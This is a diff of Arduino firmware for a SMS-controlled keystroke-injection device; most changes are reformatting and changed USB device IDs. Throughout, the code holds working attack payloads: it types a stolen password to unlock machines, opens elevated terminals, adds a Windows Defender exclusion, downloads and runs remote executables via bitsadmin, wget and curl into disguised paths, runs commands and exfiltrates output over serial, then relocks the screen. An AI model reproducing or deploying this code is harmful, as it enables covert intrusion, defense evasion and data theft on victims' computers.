@@ -1,4 +1,3 @@
-
 #include <Keyboard.h>
 #include "Payloads.h"
 #include "globals.h"
@@ -10,8 +9,7 @@ void unlockDownload(String SMS_text){
   OS.toLowerCase();
   String password = getValue(SMS_text,SEPARATOR,2);
   String url = getValue(SMS_text,SEPARATOR,3);
-  // Unlock the computer to download and execute malware
-  unlockComputer(password);
+  unlockComputer(password);   // Unlock the computer to download and execute malware
   
   // Download and execute the malware
   if(OS == F("win")){
@@ -20,21 +18,17 @@ void unlockDownload(String SMS_text){
     downloadAndRunMalwareWindows(url);
     exitTerminalWindowsLinux();
     lockWindowsLinux();
-  }
-  else if(OS == F("lnx")){
+  } else if(OS == F("lnx")){
     openTerminalLinux();
     downloadAndRunMalwareLinux(url);
     exitTerminalWindowsLinux();
     lockWindowsLinux();
-  }
-  else if(OS == F("osx")){
+  } else if(OS == F("osx")){
     openTerminalMacOs();
     downloadAndRunMalwareMacOs(url);
     exitTerminalMultiOs();
     lockMacOs();
-  }
-  else if(OS == F("winlin")){
-    //We don't know the OS but we suspect is windows or linux
+  } else if(OS == F("winlin")){  //We don't know the OS but we suspect is windows or linux
     openTerminalWindowsLinux();
     // If it's not windows it will fail, but it would be logged in the history
     downloadAndRunMalwareWindows(url);
@@ -42,22 +36,17 @@ void unlockDownload(String SMS_text){
     downloadAndRunMalwareMacOs(url);
     exitTerminalWindowsLinux();
     lockWindowsLinux();
-  }
-  else if(OS == F("multi")){
-    //We don't know the OS
+  } else if(OS == F("multi")) {  //We don't know the OS
     openTerminalMultiOs();
     //We try all the payloads
     downloadAndRunMalwareWindows(url);
     downloadAndRunMalwareLinux(url);
     downloadAndRunMalwareMacOs(url);
-    //It also closes it for Windows and Linux
-    exitTerminalMultiOs();
-    //We try to lock all the os
-    lockWindowsLinux();
+    exitTerminalMultiOs();  //It also closes it for Windows and Linux
+    lockWindowsLinux();  //We try to lock all the os
     lockMacOs();
-  }
-  else {
-    sendSMSMessage(F("Wrong OS sent for payload"));
+  } else {
+    sendSMSMessage(F("Wrong OS requested for payload"));
   }
 }
 
@@ -67,64 +56,56 @@ void unlockRunAndExfil(String SMS_text) {
   OS.toLowerCase();
   String password = getValue(SMS_text,SEPARATOR,2);
   String command = getValue(SMS_text,SEPARATOR,3);
-  // Unlock the computer to download and execute malware
-  unlockComputer(password);
+  unlockComputer(password);  // Unlock the computer to download and execute malware
   
   // Download and execute the malware
   if(OS == F("win")){
-    //Open a terminal with UAC elevated if possible
-    openTerminalWindows();
-    runAndExfilWindows(command);
-    exitTerminalWindowsLinux();
-    lockWindowsLinux();
-  }
-  else if(OS == F("lnx")){
-    openTerminalLinux();
-    runAndExfilLinux(command, password);
-    exitTerminalWindowsLinux();
-    lockWindowsLinux();
-  }
-  else if(OS == F("osx")){
-    openTerminalMacOs();
-    runAndExfilMacOs(command);
-    exitTerminalMultiOs();
-    lockMacOs();
-  }
-  else if(OS == F("winlin")){
-    //We don't know the OS but we suspect is windows or linux
-    openTerminalWindowsLinux();
-    // If it's not windows it will fail, but it would be logged in the history
-    runAndExfilWindows(command);
-    runAndExfilLinux(command, password);
-    runAndExfilMacOs(command);
-    exitTerminalWindowsLinux();
-    lockWindowsLinux();
-  }
-  else if(OS == F("multi")){
-    //We don't know the OS
-    openTerminalMultiOs();
-    //We try all the payloads
-    runAndExfilWindows(command);
-    runAndExfilLinux(command, password);
-    runAndExfilMacOs(command);
-    //It also closes it for Windows and Linux
-    exitTerminalMultiOs();
-    //We try to lock all the os
-    lockWindowsLinux();
-    lockMacOs();
-  }
-  else {
-    sendSMSMessage(F("Wrong OS sent for payload"));
+      //Open a terminal with UAC elevated if possible
+      openTerminalWindows();
+      runAndExfilWindows(command);
+      exitTerminalWindowsLinux();
+      lockWindowsLinux();
+  } else if(OS == F("lnx")){
+      openTerminalLinux();
+      runAndExfilLinux(command, password);
+      exitTerminalWindowsLinux();
+      lockWindowsLinux();
+  } else if(OS == F("osx")){
+      openTerminalMacOs();
+      runAndExfilMacOs(command);
+      exitTerminalMultiOs();
+      lockMacOs();
+  } else if(OS == F("winlin")){   //We don't know the OS but we suspect is windows or linux
+      openTerminalWindowsLinux();
+      // If it's not windows it will fail, but it would be logged in the history
+      runAndExfilWindows(command);
+      runAndExfilLinux(command, password);
+      runAndExfilMacOs(command);
+      exitTerminalWindowsLinux();
+      lockWindowsLinux();
+  } else if(OS == F("multi")){   //We don't know the OS
+      openTerminalMultiOs();
+      //We try all the payloads
+      runAndExfilWindows(command);
+      runAndExfilLinux(command, password);
+      runAndExfilMacOs(command);
+      //It also closes it for Windows and Linux
+      exitTerminalMultiOs();
+      //We try to lock all the os
+      lockWindowsLinux();
+      lockMacOs();
+  } else {
+      sendSMSMessage(F("Wrong OS requested for payload"));
   }
 }
 
-// Manuall##press##83 72 (in hex)
-// Manual##delay##100
-// Manual##release
+
+// Example: Manuall##press##83 72 (in hex)
+// Example: Manual##delay##100
+// Example: Manual##release
 void manualPayload(String SMS_text){
   String action = getValue(SMS_text,SEPARATOR,1);
   String argument = getValue(SMS_text,SEPARATOR,2);
-
   if (action == F("press")){
     // There can be an unlimited number of keystrokes separated by space
     int n_spaces = 0;
@@ -138,14 +119,11 @@ void manualPayload(String SMS_text){
         Keyboard.press((int)strtol(keystroke.c_str(), 0, 16));
     }
     Keyboard.releaseAll();
-  }
-  else if (action == F("print")){
+  } else if (action == F("print")){
     Keyboard.print(argument.c_str());
-  }
-  else if (action == F("release")){
+  } else if (action == F("release")){
     Keyboard.releaseAll();
-  }
-  else if (action == F("delay")){
+  } else if (action == F("delay")){
     delay(argument.toInt());
   }
 }
@@ -164,17 +142,17 @@ void unlockComputer(String password){
   delay(500);
   Keyboard.press('\n');
   Keyboard.releaseAll(); 
-  // It could take some time to unlock
-  delay(3000); 
+  delay(3000); // It could take some time to unlock
 }
+
 
 // It opens a terminal in Windows (7, 8, 10) it tries to open an UAC elevated cmd.exe
 void openTerminalWindows(){
-  //Keys:
+  // Keys:
   // Windows+R
-  //  cmd.exe
+  // cmd.exe
   // Enter
-  //Actions:
+  // Actions:
   // Windows: Opens cmd
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
@@ -184,35 +162,33 @@ void openTerminalWindows(){
   Keyboard.releaseAll();
   delay(2000);
   
-  //Keys:
+  // Keys:
   // powershell Start-Process cmd -Verb runAs && exit
   // Enter
   // LEFT + y 
   // Backspace
   // Escape
-  //Actions:
+  // Actions:
   // Windows: Opens cmd with UAC elevated if admin (If not fails but we still have a cmd shell from before)
   // Linux: It writes rpowershell... to the terminal and tries to run it (Not logged in the bash history)
   Keyboard.println(F("powershell Start-Process cmd -Verb runAs && exit"));
   Keyboard.releaseAll();
-  //Powershell needs time to load (at least in my very slow windows laptop)
-  delay(6000);
+  delay(6000);     //Powershell needs time to load (at least in my very slow windows laptop)
   Keyboard.press(KEY_LEFT_ALT);
   Keyboard.press('y');
   Keyboard.press(KEY_BACKSPACE);
   Keyboard.releaseAll();
   Keyboard.press(KEY_ESC);
   Keyboard.releaseAll();
-  //It also needs time after the UAC fails
-  delay(3000);
+  delay(3000);   //It also needs time after the UAC fails
 }
 
 
 // It opens a terminal in Windows (7, 8, 10) and Linux (Ubuntu, 16, 18)
 void openTerminalLinux(){
-  //Keys:
+  // Keys:
   // Ctrl+Alt+T 
-  //Actions:
+  // Actions:
   // Windows: Nothing
   // Linux: Open a terminal
   Keyboard.press(KEY_LEFT_CTRL);
@@ -220,19 +196,20 @@ void openTerminalLinux(){
   Keyboard.press('t');
   Keyboard.releaseAll();
   delay(3000);
-  //Now we are ready to execute commands in Linux :)
+  // Now we are ready to execute commands in Linux :)
 }
+
 
 // It opens a terminal in MacOS (Mojave)
 void openTerminalMacOs(){
-  //Keys:
+  // Keys:
   // Win+space
   // Win+d
   // backspace
   // Win+q
   // Esc
   // Win+space
-  //Action:
+  // Action:
   // MacOs: It opens the spotlight (and ignores Command+D a very common shortcut in MacOs)
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press(' ');
@@ -243,10 +220,10 @@ void openTerminalMacOs(){
   Keyboard.releaseAll();
   delay(1000);
 
-  //Keys:
+  // Keys:
   // terminal.app
   // Enter
-  //Actions:
+  // Actions:
   // MacOs: Open a terminal
   Keyboard.print(F("terminal.app"));
   Keyboard.releaseAll();
@@ -256,11 +233,12 @@ void openTerminalMacOs(){
   delay(3000);
 }
 
+
 // It opens a terminal in Windows (7, 8, 10) and Linux (Ubuntu, 16, 18)
 void openTerminalWindowsLinux(){
-  //Keys:
+  // Keys:
   // Win+D
-  //Action:
+  // Action:
   // Windows: It opens the desktop
   // Linux: It opens the desktop
   Keyboard.press(KEY_LEFT_GUI);
@@ -268,9 +246,9 @@ void openTerminalWindowsLinux(){
   Keyboard.releaseAll();
   delay(1000);
   
-  //Keys:
+  // Keys:
   // Ctrl+Alt+T 
-  //Actions:
+  // Actions:
   // Windows: Nothing
   // Linux: Open a terminal
   Keyboard.press(KEY_LEFT_CTRL);
@@ -279,14 +257,14 @@ void openTerminalWindowsLinux(){
   Keyboard.releaseAll();
   delay(1000);
   
-  //Keys:
+  // Keys:
   // space
   // Windows+R
-  //  cmd.exe
+  // cmd.exe
   // Enter
   // LEFT + y 
   // Backspace
-  //Actions:
+  // Actions:
   // Windows: Opens cmd
   // Linux: It writes rcmd.exe to the terminal and tries to run it (Not logged in the bash history)
   Keyboard.press(' ');
@@ -301,19 +279,19 @@ void openTerminalWindowsLinux(){
   Keyboard.releaseAll();
   delay(2000);
   
-  //Keys:
+  // Keys:
   //  powershell Start-Process cmd -Verb runAs && exit
   // Enter
   // LEFT + y 
   // Backspace
   // Escape
-  //Actions:
+  // Actions:
   // Windows: Opens cmd with UAC elevated if admin (If not fails but we still have a cmd shell from before)
   // Linux: It writes rpowershell... to the terminal and tries to run it (Not logged in the bash history)
   Keyboard.println(F(" powershell Start-Process cmd -Verb runAs && exit"));
   Keyboard.releaseAll();
-  //Powershell needs time to load (at least in my very slow windows laptop)
-  delay(6000);
+  
+  delay(6000);         // Powershell needs time to load (at least in my very slow windows laptop)
   Keyboard.press(KEY_LEFT_ALT);
   Keyboard.press('y');
   Keyboard.press(KEY_BACKSPACE);
@@ -321,23 +299,23 @@ void openTerminalWindowsLinux(){
   Keyboard.press(KEY_ESC);
   Keyboard.releaseAll();
   delay(500);
-  ///bin/bash ommits one character after you press ESC, so we press it again
-  Keyboard.press(KEY_ESC);
+    Keyboard.press(KEY_ESC);  ///bin/bash ommits one character after you press ESC, so we press it again
   Keyboard.releaseAll();
   delay(2000);
 }
 
+
 // It opens a terminal in Windows (7, 8, 10), Linux (Ubuntu 16, 18) and MacOS (Mojave)
 // It's a bit tricky and it could conflict with some custom shortcuts, so I recommends using the specific function if the OS is known.
 void openTerminalMultiOs(){
-  //Keys:
+  // Keys:
   // Win+space
   // Win+d
   // backspace
   // Win+q
   // Esc
   // Win+space
-  //Action:
+  // Action:
   // Window It opens the desktop
   // Linux: It opens the desktop
   // MacOs: It opens the spotlight (and ignores Command+D a very common shortcut in MacOs)
@@ -349,11 +327,9 @@ void openTerminalMultiOs(){
   Keyboard.press('d');
   Keyboard.releaseAll();
   delay(1000);
-  //Sometimes the spotlight has already some text, we delete it
-  Keyboard.press(KEY_BACKSPACE);
+  Keyboard.press(KEY_BACKSPACE);     //Sometimes the spotlight has already some text, we delete it
   Keyboard.releaseAll();
-  delay(1000);
-  //Sometimes Win+D opens the dictionary from the spotlight in macos. We close it with this
+  delay(1000);                       //Sometimes Win+D opens the dictionary from the spotlight in macos. We close it with this
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('q');
   Keyboard.releaseAll();
@@ -361,36 +337,35 @@ void openTerminalMultiOs(){
   Keyboard.press(KEY_ESC);
   Keyboard.releaseAll();
   delay(1000);
-  //We reopen the spotlight
-  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press(KEY_LEFT_GUI);    //We reopen the spotlight
   Keyboard.press(' ');
   Keyboard.releaseAll();
   delay(1000);
 
-//This doesn't work all the times, it deselect the icon but an app in the task bar gets selected, and that's worst with the next commands
-  //Keys:
+  // This doesn't work all the times, it deselect the icon but an app in the task bar gets selected, and that's worst with the next commands
+  // Keys:
   // Menu key (Shift + F10)
   // R
   // ESC
-  //Actions:
+  // Actions:
   // Windows: Deselects the current item in the desktop
   // Linux: Nothing
   // MacOs: Nothing
-//  Keyboard.press(KEY_LEFT_SHIFT);
-//  Keyboard.press(KEY_F10);
-//  Keyboard.releaseAll();
-//  delay(500);
-//  Keyboard.press('R');
-//  Keyboard.releaseAll();
-//  delay(500);
-//  Keyboard.press(KEY_ESC);
-//  Keyboard.releaseAll();
-//  delay(500);
+  //  Keyboard.press(KEY_LEFT_SHIFT);
+  //  Keyboard.press(KEY_F10);
+  //  Keyboard.releaseAll();
+  //  delay(500);
+  //  Keyboard.press('R');
+  //  Keyboard.releaseAll();
+  //  delay(500);
+  //  Keyboard.press(KEY_ESC);
+  //  Keyboard.releaseAll();
+  //  delay(500);
 
-  //Keys:
+  // Keys:
   // terminal.app
   // Enter
-  //Actions:
+  // Actions:
   // Windows: Nothing
   // Linux: It tries to execute that command but it fails
   // MacOs: Open a terminal
@@ -401,9 +376,9 @@ void openTerminalMultiOs(){
   Keyboard.releaseAll();
   delay(1000);
 
-  //Keys:
+  // Keys:
   // Ctrl+Alt+T 
-  //Actions:
+  // Actions:
   // Windows: Nothing
   // Linux: Open a terminal
   // MacOs: Nothing (We are in the terminal)
@@ -413,12 +388,12 @@ void openTerminalMultiOs(){
   Keyboard.releaseAll();
   delay(1000);
 
-  //Keys:
+  // Keys:
   // space
   // Windows+R
   //  cmd.exe
   // Enter
-  //Actions:
+  // Actions:
   // Windows: Opens cmd
   // Linux: It writes rcmd.exe to the terminal and tries to run it (Not logged in the bash history)
   // MacOs: It writes cmd.exe to the terminal and tries to run it (Not logged in the bash history)
@@ -434,36 +409,33 @@ void openTerminalMultiOs(){
   Keyboard.releaseAll();
   delay(2000);
   
-  //Keys:
+  // Keys:
   //  powershell Start-Process cmd -Verb runAs && exit
   // Enter
   // LEFT + y 
   // Backspace
   // Escape
-  //Actions:
+  // Actions:
   // Windows: Opens cmd with UAC elevated if admin (If not fails but we still have a cmd shell from before)
   // Linux: It writes rpowershell... to the terminal and tries to run it (Not logged in the bash history)
   // MacOs: It writes powershell... to the terminal and tries to run it (Not logged in the bash history)
   Keyboard.print(F(" powershell Start-Process cmd -Verb runAs && exit"));
   Keyboard.press('\n');
   Keyboard.releaseAll();
-  //Powershell needs time to load (at least in my very slow windows laptop)
-  delay(4000);
+  delay(4000);    //Powershell needs time to load (at least in my very slow windows laptop)
   Keyboard.press(KEY_LEFT_ALT);
   Keyboard.press('y');
   Keyboard.press(KEY_BACKSPACE);
   Keyboard.releaseAll();
-  ///bin/bash ommits one character after you press ESC, so we press it again
-  Keyboard.press(KEY_ESC);
+  Keyboard.press(KEY_ESC);   ///bin/bash ommits one character after you press ESC, so we press it again
   Keyboard.releaseAll();
   delay(500);
-  ///bin/bash ommits one character after you press ESC, so we press it again
-  Keyboard.press(KEY_ESC);
+  Keyboard.press(KEY_ESC);   ///bin/bash ommits one character after you press ESC, so we press it again
   Keyboard.releaseAll();
   delay(2000);
-
   //Now we are ready to execute commands in all OS :)
 }
+
 
 void downloadAndRunMalwareWindows(String url){
   Serial.println("url "+url);
@@ -471,7 +443,6 @@ void downloadAndRunMalwareWindows(String url){
   Keyboard.println(F("powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath %appdata%"));
   Keyboard.releaseAll(); 
   delay(3000);
-
   Keyboard.print(F("bitsadmin /transfer winupdate /download /priority foreground "));
   Keyboard.print(url);
   Keyboard.println(F(" %appdata%\\Microsoft\\wintask.exe && start \"\" %appdata%\\Microsoft\\wintask.exe"));
@@ -479,48 +450,52 @@ void downloadAndRunMalwareWindows(String url){
   delay(2000);        
 }
 
-// By default ubuntu has wget but not curl
-// Tested it in bash, zsh and fish shells
+
+// By default ubuntu has wget but not curl. Tested it in bash, zsh and fish shells
 // disown is important for zsh, if not zsh doesn't exit after exit because of a pending job
 void downloadAndRunMalwareLinux(String url){
   Keyboard.print(F(" export x=/tmp/.logCollector && wget --no-check-certificate "));
   Keyboard.print(url);
-  Keyboard.println(F(" -O $x && chmod +x $x && nohup $x & disown"));
+  Keyboard.print(F(" -O $x && chmod +x $x && nohup $x & disown"));
+  Keyboard.print("\n");
   Keyboard.releaseAll();
   delay(1000);
 }
 
-// By default MacOs has curl but not wget
-// Tested it in bash, zsh and fish shells
+
+// By default MacOs has curl but not wget. Tested it in bash, zsh and fish shells
 // disown is important for zsh, if not zsh doesn't exit after exit because of a pending job
 void downloadAndRunMalwareMacOs(String url){
   Keyboard.print(F(" export x=/tmp/.logCollector && curl -k "));
   Keyboard.print(url);
-  Keyboard.println(F(" -o $x && chmod +x $x && nohup $x & disown"));
+  Keyboard.print(F(" -o $x && chmod +x $x && nohup $x & disown"));
+  Keyboard.print("\n");
   Keyboard.releaseAll();
   delay(1000); 
 }
 
+
 void exitTerminalWindowsLinux(){
-  //Keys:
+  // Keys:
   // exit
   //Actions:
   // Windows: Closes the terminal
   // Linux: Closes the terminal
   // MacOs: Closes the shell but the terminal remains open
-  Keyboard.println(F(" exit"));
+  Keyboard.print(F(" exit"));
+  Keyboard.print("\n");
   Keyboard.releaseAll();
   delay(1000);
 }
 
+
 void exitTerminalMultiOs(){
   exitTerminalWindowsLinux();
-
-  //Only for MacOs
-  //Keys:
+  // Only for MacOs
+  // Keys:
   // Alt+Q
   // ESC
-  //Actions:
+  // Actions:
   // Windows: Nothing (Open the search bar in win8 and closes it with ESC)
   // Linux: Nothing
   // MacOs: Closes the terminal window
@@ -532,12 +507,14 @@ void exitTerminalMultiOs(){
   Keyboard.releaseAll();
 }
 
+
 void lockWindowsLinux(){
   Keyboard.press(KEY_RIGHT_GUI);
   Keyboard.press('l');
   Keyboard.releaseAll(); 
   delay(1000);
 }
+
 
 void lockMacOs(){
   Keyboard.press(KEY_LEFT_GUI);
@@ -547,32 +524,33 @@ void lockMacOs(){
   delay(1000);
 }
 
-//These strings use a lot of the memory so we use PROGMEM to store it in the code area
-//const char powershell_command_1[] PROGMEM = " powershell -Command \"$s=(Get-WmiObject -Class Win32_PnPEntity -Namespace \\\"root\\CIMV2\\\" -Filter \\\"PNPDeviceID like 'USB\\\\VID_2341^&PID_8036%'\\\").Caption; $com=[regex]::match($s,'\\(([^\\)]+)\\)').Groups[1].Value; $cmd=";
-//const char powershell_command_2[] PROGMEM = ;
 
-//This COM exfiltration payload was written by Luca Bongiorni https://twitter.com/LucaBongiorni
+// These strings use a lot of the memory so we use PROGMEM to store it in the code area
+// This COM exfiltration payload was written by Luca Bongiorni https://twitter.com/LucaBongiorni
 void runAndExfilWindows(String command) {
-  Keyboard.print(F(" powershell -Command \"$s=(Get-WmiObject -Class Win32_PnPEntity -Namespace \\\"root\\CIMV2\\\" -Filter \\\"PNPDeviceID like '_SB\\\\VID_2341^&PID_8036%'\\\").Caption; $com=[regex]::match($s,'\\(([^\\)]+)\\)').Groups[1].Value; $cmd="));
-  // We avoid concatenation to avoid dynamic memory usage
-  Keyboard.print(command);
+  Keyboard.print(F(" powershell -Command \"$s=(Get-WmiObject -Class Win32_PnPEntity -Namespace \\\"root\\CIMV2\\\" -Filter \\\"PNPDeviceID like '_SB\\\\VID_03f9^&PID_0102%'\\\").Caption; $com=[regex]::match($s,'\\(([^\\)]+)\\)').Groups[1].Value; $cmd="));
+  Keyboard.print(command);  // We avoid concatenation to avoid dynamic memory usage
   Keyboard.println(F("; $port= new-Object System.IO.Ports.SerialPort $com,38400,None,8,one; $port.open(); $port.WriteLine(\\\"$cmd\\\"); $port.Close();"));
   delay(3000);  
 }
 
+
 // In ubuntu we need to be root or part of the dialout group
 void runAndExfilLinux(String command, String password) {
-  Keyboard.print(F("sudo /bin/bash -c \"stty -F /dev/serial/by-id/*Arduino* 38400 && "));
+  Keyboard.print(F("sudo /bin/bash -c \"stty -F /dev/serial/by-id/*HIDPCD* 38400 && "));
   Keyboard.print(command);
-  Keyboard.println(F(" > /dev/serial/by-id/*Arduino*\""));
+  Keyboard.print(F(" > /dev/serial/by-id/*HIDPCD*\""));
+  Keyboard.print("\n");
   delay(1000);
-  Keyboard.println(password);
+  Keyboard.print(password + "\n");
   delay(3000);  
 }
+
 
 void runAndExfilMacOs(String command) {
   Keyboard.print(F(" stty -f /dev/cu.usbmodem* 38400 && "));
   Keyboard.print(command);
-  Keyboard.println(F(" > /dev/cu.usbmodem*"));
+  Keyboard.print(F(" > /dev/cu.usbmodem*"));
+  Keyboard.print("\n");
   delay(3000);
 }
